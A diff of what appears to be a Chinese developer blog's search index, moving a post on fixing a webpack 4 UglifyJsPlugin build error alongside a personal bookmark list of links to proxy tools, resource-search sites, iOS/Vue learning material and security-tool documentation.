-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^CHu-YupingdeMacBook-Pro:demo2 kris$ npm run build</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 build /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=production webpack --progress --hide-modules</span><br><span class="line"></span><br><span class="line">Hash: e1e94d754213e6db3b2c</span><br><span class="line">Version: webpack 4.42.0</span><br><span class="line">Time: 1996ms</span><br><span class="line">Built at: 2020-03-19 13:51:57</span><br><span class="line">   Asset     Size  Chunks             Chunk Names</span><br><span class="line">build.js  213 KiB       0  [emitted]  main</span><br><span class="line">Entrypoint main = build.js</span><br><span class="line"></span><br><span class="line">WARNING <span class="keyword">in</span> configuration</span><br><span class="line">The <span class="string">&#x27;mode&#x27;</span> option has not been <span class="built_in">set</span>, webpack will fallback to <span class="string">&#x27;production&#x27;</span> <span class="keyword">for</span> this value. Set <span class="string">&#x27;mode&#x27;</span> option to <span class="string">&#x27;development&#x27;</span> or <span class="string">&#x27;production&#x27;</span> to <span class="built_in">enable</span> defaults <span class="keyword">for</span> each environment.</span><br><span class="line">You can also <span class="built_in">set</span> it to <span class="string">&#x27;none&#x27;</span> to <span class="built_in">disable</span> any default behavior. Learn more: https://webpack.js.org/configuration/mode/</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.jianshu.com/p/ceaf950a027b">webpack踩坑之路</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>前端</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>iOS 12越狱</title>
     <url>/Blog/2021/01/03/iOS-12%E8%B6%8A%E7%8B%B1/</url>
     <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
@@ -2888,6 +2798,70 @@ NSRunLoopCommonModes并不是一个真的模式，它只是一个标记,timer能
       </tags>
   </entry>
   <entry>
+    <title>有趣的网址</title>
+    <url>/Blog/2019/06/15/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E5%9D%80/</url>
+    <content><![CDATA[<h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><p><a href="http://gufenso.coderschool.cn/">http://gufenso.coderschool.cn/</a> (谷粉搜导航，可以临时用一下谷歌搜索)</p>
+<p><a href="https://coderschool.cn/2366.html">https://coderschool.cn/2366.html</a>  （谷歌镜像网站链接收集，有广告）</p>
+<p>链接: <a href="https://pan.baidu.com/s/1gePw35p">https://pan.baidu.com/s/1gePw35p</a> 密码: kw1k  （Chrom的饭前插件，注册一个账号，可以免费使用）</p>
+<p><a href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a>   （这个配置有些麻烦，不过用起来还不错，免费）</p>
+<p><a href="https://google.jiongjun.cc/user/miror.html">https://google.jiongjun.cc/user/miror.html</a>  （廉价VPS，还有搬瓦工优惠码）</p>
+<p><a href="https://blog.kuoruan.com/48.html">https://blog.kuoruan.com/48.html</a>  （搬瓦工搭建Shadowsocks并优化速度）</p>
+<p><a href="https://github.com/iMeiji/shadowsocks_install/blob/master/shadowsocksR-wiki/config.json.md">https://github.com/iMeiji/shadowsocks_install/blob/master/shadowsocksR-wiki/config.json.md</a>  (SSR配置文件更改)</p>
+<p><a href="https://github.com/racaljk/hosts/blob/master/README.md">https://github.com/racaljk/hosts/blob/master/README.md</a>  （Hosts文件）</p>
+<h2 id="谷歌镜像网站"><a href="#谷歌镜像网站" class="headerlink" title="谷歌镜像网站"></a>谷歌镜像网站</h2><p><a href="https://www.uedbox.com/post/54776/">https://www.uedbox.com/post/54776/</a> (体验盒子)<br><a href="http://gufenso.coderschool.cn/">http://gufenso.coderschool.cn/</a> (谷粉搜导航，可以临时用一下谷歌搜索)</p>
+<h2 id="Vultr搭建VPS相关教程："><a href="#Vultr搭建VPS相关教程：" class="headerlink" title="Vultr搭建VPS相关教程："></a>Vultr搭建VPS相关教程：</h2><p><a href="https://www.jiongjun.cc/vultr/315.html">https://www.jiongjun.cc/vultr/315.html</a>  (购买和搭建VPS详细教程)</p>
+<p><a href="http://yucc.me/p/b4d20b2d/">http://yucc.me/p/b4d20b2d/</a>  (简略版教程)</p>
+<h2 id="Shadowsocks-客户端下载："><a href="#Shadowsocks-客户端下载：" class="headerlink" title="Shadowsocks 客户端下载："></a>Shadowsocks 客户端下载：</h2><p><a href="https://lvii.gitbooks.io/outman/content/ss.mac.html">https://lvii.gitbooks.io/outman/content/ss.mac.html</a></p>
+<p><a href="https://github.com/shadowsocks/ShadowsocksX-NG/releases/">https://github.com/shadowsocks/ShadowsocksX-NG/releases/</a>  （MAC版客户端下载地址）</p>
+<h2 id="资源搜索："><a href="#资源搜索：" class="headerlink" title="资源搜索："></a>资源搜索：</h2><p><a href="https://www.panc.cc/">https://www.panc.cc/</a> 胖次（最新的电影资源，会抽风）</p>
+<p><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a> 去转盘 （最新的电影，综艺）</p>
+<p><a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a> 虫部落  （整理非常好的搜索站）</p>
+<p><a href="http://www.torrent.org.cn/">http://www.torrent.org.cn</a> (种子和磁链互相转换的网站)</p>
+<p><a href="https://www.91btbtt.com/">BT之家</a></p>
+<p><a href="https://www.mebtbtt.com/">BT之家</a></p>
+<p><a href="https://www.btbtt.life/">BT之家</a></p>
+<p><a href="https://www.btbtt.live/">BT之家</a></p>
+<p><a href="https://video.bqrdh.com/">不求人导航</a></p>
+<h2 id="资源下载："><a href="#资源下载：" class="headerlink" title="资源下载："></a>资源下载：</h2><p>Aria2c </p>
+<p>bt-tracker数据:<a href="https://github.com/ngosang/trackerslist/blob/master/trackers_all_udp.txt">https://github.com/ngosang/trackerslist/blob/master/trackers_all_udp.txt</a></p>
+<p><a href="https://cowtransfer.com/">奶牛快传(分享临时文件)</a></p>
+<h2 id="计算机免费书籍GitHub合集"><a href="#计算机免费书籍GitHub合集" class="headerlink" title="计算机免费书籍GitHub合集:"></a>计算机免费书籍GitHub合集:</h2><p><a href="https://github.com/justjavac/free-programming-books-zh_CN">justjavac/free-programming-books-zh_CN</a>(免费的编程中文书籍索引)</p>
+<h2 id="iOS-开发："><a href="#iOS-开发：" class="headerlink" title="iOS 开发："></a>iOS 开发：</h2><p><a href="https://github.com/Tim9Liu9/TimLiu-iOS">https://github.com/Tim9Liu9/TimLiu-iOS</a> （iOS Demo，教程等等）</p>
+<p><a href="https://github.com/Aufree/trip-to-iOS">https://github.com/Aufree/trip-to-iOS</a> （偏向于教程）</p>
+<p><a href="https://github.com/jobbole/awesome-ios-cn">https://github.com/jobbole/awesome-ios-cn</a> （iOS 资源大全中文版，Demo比较全）</p>
+<p><a href="https://github.com/Lax/iOS-Swift-Demos">https://github.com/Lax/iOS-Swift-Demos</a> （Swift 学习资源）</p>
+<p><a href="https://github.com/leecade/ios-dev-flow">https://github.com/leecade/ios-dev-flow</a> （iOS 开发证书相关）</p>
+<p><a href="https://github.com/Draveness/analyze">https://github.com/Draveness/analyze</a>  （iOS开源框架源代码解析）</p>
+<p><a href="https://github.com/zhouhuanqiang/LearningIOS">https://github.com/zhouhuanqiang/LearningIOS</a>  （iOS视频教程）</p>
+<p><a href="http://bbs.itheima.com/thread-338489-1-1.html">http://bbs.itheima.com/thread-338489-1-1.html</a></p>
+<p><a href="https://zsisme.gitbooks.io/ios-/content/index.html">https://zsisme.gitbooks.io/ios-/content/index.html</a>  (iOS核心动画)</p>
+<p><a href="https://nshipster.cn/">https://nshipster.cn/</a></p>
+<h2 id="Vue-开发："><a href="#Vue-开发：" class="headerlink" title="Vue 开发："></a>Vue 开发：</h2><p><a href="https://github.com/vuejs/awesome-vue">vuejs/awesome-vue</a>(vue 学习资料)</p>
+<p><a href="https://ke.qq.com/course/402398?taid=3214894690608094">硅谷外卖视频课程以及很多免费课程</a></p>
+<h2 id="iPhone机型介绍："><a href="#iPhone机型介绍：" class="headerlink" title="iPhone机型介绍："></a>iPhone机型介绍：</h2><p><a href="https://support.apple.com/zh-cn/HT201296">https://support.apple.com/zh-cn/HT201296</a>  （iPhone各种机型的详细介绍）</p>
+<p><a href="https://www.theiphonewiki.com/wiki/Models">https://www.theiphonewiki.com/wiki/Models</a>  （iOS各种设备的Model的介绍）</p>
+<h2 id="Android开发："><a href="#Android开发：" class="headerlink" title="Android开发："></a>Android开发：</h2><p><a href="http://bbs.itheima.com/thread-338469-1-1.html">http://bbs.itheima.com/thread-338469-1-1.html</a></p>
+<h2 id="VR开发："><a href="#VR开发：" class="headerlink" title="VR开发："></a>VR开发：</h2><p><a href="https://github.com/GeekLiB/Lee-VR-Source">https://github.com/GeekLiB/Lee-VR-Source</a></p>
+<h2 id="工具网站："><a href="#工具网站：" class="headerlink" title="工具网站："></a>工具网站：</h2><p><a href="http://www.iconfont.cn/">http://www.iconfont.cn/</a>   （阿里巴巴矢量图标库）</p>
+<p><a href="https://github.com/shengxinjing/programmer-job-blacklist">https://github.com/shengxinjing/programmer-job-blacklist</a>  （程序员找工作黑名单）</p>
+<h2 id="设计类网站"><a href="#设计类网站" class="headerlink" title="设计类网站:"></a>设计类网站:</h2><p><a href="http://www.xueui.cn/">http://www.xueui.cn</a></p>
+<p><a href="https://magdeleine.co/">https://magdeleine.co</a>  (免费高清摄影图片下载)</p>
+<p><a href="http://blog.cocoachina.com/article/73408">http://blog.cocoachina.com/article/73408</a> （8个免费UI图标网站）</p>
+<h2 id="逆向工程与加密解密："><a href="#逆向工程与加密解密：" class="headerlink" title="逆向工程与加密解密："></a>逆向工程与加密解密：</h2><p><a href="https://pan.baidu.com/pcloud/album/info?uk=1745354485&amp;album_id=3855093648109743244">https://pan.baidu.com/pcloud/album/info?uk=1745354485&amp;album_id=3855093648109743244</a>  （百度网盘分享链接）</p>
+<p><a href="https://www.hackfun.org/kali-tools/kali-tools-zh.html">https://www.hackfun.org/kali-tools/kali-tools-zh.html</a>  （Kali工具说明书）</p>
+<p><a href="http://www.he11oworld.com/tag/shentoujiaocheng/page/2/">http://www.he11oworld.com/tag/shentoujiaocheng/page/2/</a> （渗透教程下载）</p>
+<p><a href="http://daily.zhihu.com/story/3877456">http://daily.zhihu.com/story/3877456</a> （安全网站列表）</p>
+<h2 id="社区："><a href="#社区：" class="headerlink" title="社区："></a>社区：</h2><p>伯乐在线 （<a href="https://github.com/jobbole%EF%BC%89">https://github.com/jobbole）</a></p>
+<p><a href="https://www.v2ex.com/go/idev">https://www.v2ex.com/go/idev</a></p>
+]]></content>
+      <categories>
+        <category>通用</category>
+      </categories>
+      <tags>
+        <tag>通用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>时间复杂度和空间复杂度</title>
     <url>/Blog/2020/09/05/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%92%8C%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/</url>
     <content><![CDATA[<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>算法（Algorithm）是指用来操作数据、解决程序问题的一组方法。对于同一个问题，使用不同的算法，也许最终得到的结果是一样的，但在过程中消耗的资源和时间却会有很大的区别。</p>
@@ -3046,67 +3020,70 @@ NSRunLoopCommonModes并不是一个真的模式，它只是一个标记,timer能
       </tags>
   </entry>
   <entry>
-    <title>有趣的网址</title>
-    <url>/Blog/2019/06/15/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E5%9D%80/</url>
-    <content><![CDATA[<h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><p><a href="http://gufenso.coderschool.cn/">http://gufenso.coderschool.cn/</a> (谷粉搜导航，可以临时用一下谷歌搜索)</p>
-<p><a href="https://coderschool.cn/2366.html">https://coderschool.cn/2366.html</a>  （谷歌镜像网站链接收集，有广告）</p>
-<p>链接: <a href="https://pan.baidu.com/s/1gePw35p">https://pan.baidu.com/s/1gePw35p</a> 密码: kw1k  （Chrom的饭前插件，注册一个账号，可以免费使用）</p>
-<p><a href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a>   （这个配置有些麻烦，不过用起来还不错，免费）</p>
-<p><a href="https://google.jiongjun.cc/user/miror.html">https://google.jiongjun.cc/user/miror.html</a>  （廉价VPS，还有搬瓦工优惠码）</p>
-<p><a href="https://blog.kuoruan.com/48.html">https://blog.kuoruan.com/48.html</a>  （搬瓦工搭建Shadowsocks并优化速度）</p>
-<p><a href="https://github.com/iMeiji/shadowsocks_install/blob/master/shadowsocksR-wiki/config.json.md">https://github.com/iMeiji/shadowsocks_install/blob/master/shadowsocksR-wiki/config.json.md</a>  (SSR配置文件更改)</p>
-<p><a href="https://github.com/racaljk/hosts/blob/master/README.md">https://github.com/racaljk/hosts/blob/master/README.md</a>  （Hosts文件）</p>
-<h2 id="谷歌镜像网站"><a href="#谷歌镜像网站" class="headerlink" title="谷歌镜像网站"></a>谷歌镜像网站</h2><p><a href="https://www.uedbox.com/post/54776/">https://www.uedbox.com/post/54776/</a> (体验盒子)<br><a href="http://gufenso.coderschool.cn/">http://gufenso.coderschool.cn/</a> (谷粉搜导航，可以临时用一下谷歌搜索)</p>
-<h2 id="Vultr搭建VPS相关教程："><a href="#Vultr搭建VPS相关教程：" class="headerlink" title="Vultr搭建VPS相关教程："></a>Vultr搭建VPS相关教程：</h2><p><a href="https://www.jiongjun.cc/vultr/315.html">https://www.jiongjun.cc/vultr/315.html</a>  (购买和搭建VPS详细教程)</p>
-<p><a href="http://yucc.me/p/b4d20b2d/">http://yucc.me/p/b4d20b2d/</a>  (简略版教程)</p>
-<h2 id="Shadowsocks-客户端下载："><a href="#Shadowsocks-客户端下载：" class="headerlink" title="Shadowsocks 客户端下载："></a>Shadowsocks 客户端下载：</h2><p><a href="https://lvii.gitbooks.io/outman/content/ss.mac.html">https://lvii.gitbooks.io/outman/content/ss.mac.html</a></p>
-<p><a href="https://github.com/shadowsocks/ShadowsocksX-NG/releases/">https://github.com/shadowsocks/ShadowsocksX-NG/releases/</a>  （MAC版客户端下载地址）</p>
-<h2 id="资源搜索："><a href="#资源搜索：" class="headerlink" title="资源搜索："></a>资源搜索：</h2><p><a href="https://www.panc.cc/">https://www.panc.cc/</a> 胖次（最新的电影资源，会抽风）</p>
-<p><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a> 去转盘 （最新的电影，综艺）</p>
-<p><a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a> 虫部落  （整理非常好的搜索站）</p>
-<p><a href="http://www.torrent.org.cn/">http://www.torrent.org.cn</a> (种子和磁链互相转换的网站)</p>
-<p><a href="https://www.91btbtt.com/">BT之家</a></p>
-<p><a href="https://www.mebtbtt.com/">BT之家</a></p>
-<p><a href="https://www.btbtt.life/">BT之家</a></p>
-<p><a href="https://www.btbtt.live/">BT之家</a></p>
-<p><a href="https://video.bqrdh.com/">不求人导航</a></p>
-<h2 id="资源下载："><a href="#资源下载：" class="headerlink" title="资源下载："></a>资源下载：</h2><p>Aria2c </p>
-<p>bt-tracker数据:<a href="https://github.com/ngosang/trackerslist/blob/master/trackers_all_udp.txt">https://github.com/ngosang/trackerslist/blob/master/trackers_all_udp.txt</a></p>
-<p><a href="https://cowtransfer.com/">奶牛快传(分享临时文件)</a></p>
-<h2 id="计算机免费书籍GitHub合集"><a href="#计算机免费书籍GitHub合集" class="headerlink" title="计算机免费书籍GitHub合集:"></a>计算机免费书籍GitHub合集:</h2><p><a href="https://github.com/justjavac/free-programming-books-zh_CN">justjavac/free-programming-books-zh_CN</a>(免费的编程中文书籍索引)</p>
-<h2 id="iOS-开发："><a href="#iOS-开发：" class="headerlink" title="iOS 开发："></a>iOS 开发：</h2><p><a href="https://github.com/Tim9Liu9/TimLiu-iOS">https://github.com/Tim9Liu9/TimLiu-iOS</a> （iOS Demo，教程等等）</p>
-<p><a href="https://github.com/Aufree/trip-to-iOS">https://github.com/Aufree/trip-to-iOS</a> （偏向于教程）</p>
-<p><a href="https://github.com/jobbole/awesome-ios-cn">https://github.com/jobbole/awesome-ios-cn</a> （iOS 资源大全中文版，Demo比较全）</p>
-<p><a href="https://github.com/Lax/iOS-Swift-Demos">https://github.com/Lax/iOS-Swift-Demos</a> （Swift 学习资源）</p>
-<p><a href="https://github.com/leecade/ios-dev-flow">https://github.com/leecade/ios-dev-flow</a> （iOS 开发证书相关）</p>
-<p><a href="https://github.com/Draveness/analyze">https://github.com/Draveness/analyze</a>  （iOS开源框架源代码解析）</p>
-<p><a href="https://github.com/zhouhuanqiang/LearningIOS">https://github.com/zhouhuanqiang/LearningIOS</a>  （iOS视频教程）</p>
-<p><a href="http://bbs.itheima.com/thread-338489-1-1.html">http://bbs.itheima.com/thread-338489-1-1.html</a></p>
-<p><a href="https://zsisme.gitbooks.io/ios-/content/index.html">https://zsisme.gitbooks.io/ios-/content/index.html</a>  (iOS核心动画)</p>
-<p><a href="https://nshipster.cn/">https://nshipster.cn/</a></p>
-<h2 id="Vue-开发："><a href="#Vue-开发：" class="headerlink" title="Vue 开发："></a>Vue 开发：</h2><p><a href="https://github.com/vuejs/awesome-vue">vuejs/awesome-vue</a>(vue 学习资料)</p>
-<p><a href="https://ke.qq.com/course/402398?taid=3214894690608094">硅谷外卖视频课程以及很多免费课程</a></p>
-<h2 id="iPhone机型介绍："><a href="#iPhone机型介绍：" class="headerlink" title="iPhone机型介绍："></a>iPhone机型介绍：</h2><p><a href="https://support.apple.com/zh-cn/HT201296">https://support.apple.com/zh-cn/HT201296</a>  （iPhone各种机型的详细介绍）</p>
-<p><a href="https://www.theiphonewiki.com/wiki/Models">https://www.theiphonewiki.com/wiki/Models</a>  （iOS各种设备的Model的介绍）</p>
-<h2 id="Android开发："><a href="#Android开发：" class="headerlink" title="Android开发："></a>Android开发：</h2><p><a href="http://bbs.itheima.com/thread-338469-1-1.html">http://bbs.itheima.com/thread-338469-1-1.html</a></p>
-<h2 id="VR开发："><a href="#VR开发：" class="headerlink" title="VR开发："></a>VR开发：</h2><p><a href="https://github.com/GeekLiB/Lee-VR-Source">https://github.com/GeekLiB/Lee-VR-Source</a></p>
-<h2 id="工具网站："><a href="#工具网站：" class="headerlink" title="工具网站："></a>工具网站：</h2><p><a href="http://www.iconfont.cn/">http://www.iconfont.cn/</a>   （阿里巴巴矢量图标库）</p>
-<p><a href="https://github.com/shengxinjing/programmer-job-blacklist">https://github.com/shengxinjing/programmer-job-blacklist</a>  （程序员找工作黑名单）</p>
-<h2 id="设计类网站"><a href="#设计类网站" class="headerlink" title="设计类网站:"></a>设计类网站:</h2><p><a href="http://www.xueui.cn/">http://www.xueui.cn</a></p>
-<p><a href="https://magdeleine.co/">https://magdeleine.co</a>  (免费高清摄影图片下载)</p>
-<p><a href="http://blog.cocoachina.com/article/73408">http://blog.cocoachina.com/article/73408</a> （8个免费UI图标网站）</p>
-<h2 id="逆向工程与加密解密："><a href="#逆向工程与加密解密：" class="headerlink" title="逆向工程与加密解密："></a>逆向工程与加密解密：</h2><p><a href="https://pan.baidu.com/pcloud/album/info?uk=1745354485&amp;album_id=3855093648109743244">https://pan.baidu.com/pcloud/album/info?uk=1745354485&amp;album_id=3855093648109743244</a>  （百度网盘分享链接）</p>
-<p><a href="https://www.hackfun.org/kali-tools/kali-tools-zh.html">https://www.hackfun.org/kali-tools/kali-tools-zh.html</a>  （Kali工具说明书）</p>
-<p><a href="http://www.he11oworld.com/tag/shentoujiaocheng/page/2/">http://www.he11oworld.com/tag/shentoujiaocheng/page/2/</a> （渗透教程下载）</p>
-<p><a href="http://daily.zhihu.com/story/3877456">http://daily.zhihu.com/story/3877456</a> （安全网站列表）</p>
-<h2 id="社区："><a href="#社区：" class="headerlink" title="社区："></a>社区：</h2><p>伯乐在线 （<a href="https://github.com/jobbole%EF%BC%89">https://github.com/jobbole）</a></p>
-<p><a href="https://www.v2ex.com/go/idev">https://www.v2ex.com/go/idev</a></p>
+    <title>Vue打包报错Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</title>
+    <url>/Blog/2020/03/19/Vue%E6%89%93%E5%8C%85%E6%8A%A5%E9%94%99Error-webpack-optimize-UglifyJsPlugin-has-been-removed-please-use-config-optimization-minimize-instead/</url>
+    <content><![CDATA[<p>使用命令<code>npm run build</code>进行生产构建时，报错<code>Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</code>，详细的错误信息如下:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^CHu-YupingdeMacBook-Pro:demo2 kris$ npm run build</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 build /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=production webpack --progress --hide-modules</span><br><span class="line"></span><br><span class="line">/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:93</span><br><span class="line">				throw err;</span><br><span class="line">				^</span><br><span class="line"></span><br><span class="line">Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</span><br><span class="line">    at Object.get [as UglifyJsPlugin] (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack/lib/webpack.js:189:10)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/webpack.config.js:68:26)</span><br><span class="line">    at Module._compile (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/v8-compile-cache/v8-compile-cache.js:192:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:531:3)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:637:17)</span><br><span class="line">    at require (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/v8-compile-cache/v8-compile-cache.js:161:20)</span><br><span class="line">    at WEBPACK_OPTIONS (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:114:13)</span><br><span class="line">    at requireConfig (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:116:6)</span><br><span class="line">    at /Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:123:17</span><br><span class="line">    at Array.forEach (&lt;anonymous&gt;)</span><br><span class="line">    at module.exports (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:121:15)</span><br><span class="line">    at yargs.parse (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:71:45)</span><br><span class="line">    at Object.parse (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/yargs/yargs.js:567:18)</span><br><span class="line">    at /Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:49:8</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:366:3)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:701:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:531:3)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:637:17)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:22:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack/bin/webpack.js:156:2)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:701:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">npm ERR! code ELIFECYCLE</span><br><span class="line">npm ERR! errno 1</span><br><span class="line">npm ERR! demo2@1.0.0 build: `cross-env NODE_ENV=production webpack --progress --hide-modules`</span><br><span class="line">npm ERR! Exit status 1</span><br><span class="line">npm ERR! </span><br><span class="line">npm ERR! Failed at the demo2@1.0.0 build script.</span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /Users/kris/.npm/_logs/2020-03-19T04_56_08_555Z-debug.log</span><br></pre></td></tr></table></figure>
+
+<p>查资料发现webpack4已经不支持在plugins里面操作<code>UglifyJsPlugin</code>，需要将<code>UglifyJsPlugin</code>放到<code>optimization</code>里面进行配置。打开<code>webpack.config.js</code>文件，发现老的配置如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var path = require(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">var webpack = require(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    publicPath: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">    filename: <span class="string">&#x27;build.js&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.css$/,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;vue-style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">        ],</span><br><span class="line">      &#125;,      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.vue$/,</span><br><span class="line">        loader: <span class="string">&#x27;vue-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          loaders: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          // other vue-loader options go here</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.js$/,</span><br><span class="line">        loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        exclude: /node_modules/</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.(png|jpg|gif|svg)$/,</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          name: <span class="string">&#x27;[name].[ext]?[hash]&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    <span class="built_in">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extensions: [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">    noInfo: <span class="literal">true</span>,</span><br><span class="line">    overlay: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  performance: &#123;</span><br><span class="line">    hints: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  devtool: <span class="string">&#x27;#eval-source-map&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  module.exports.devtool = <span class="string">&#x27;#source-map&#x27;</span></span><br><span class="line">  // http://vue-loader.vuejs.org/en/workflow/production.html</span><br><span class="line">  module.exports.plugins = (module.exports.plugins || []).concat([</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">&#x27;process.env&#x27;</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="string">&#x27;&quot;production&quot;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.optimize.UglifyJsPlugin(&#123;</span><br><span class="line">      sourceMap: <span class="literal">true</span>,</span><br><span class="line">      compress: &#123;</span><br><span class="line">        warnings: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.LoaderOptionsPlugin(&#123;</span><br><span class="line">      minimize: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改完的<code>webpack.config.js</code>文件内容如下:</p>
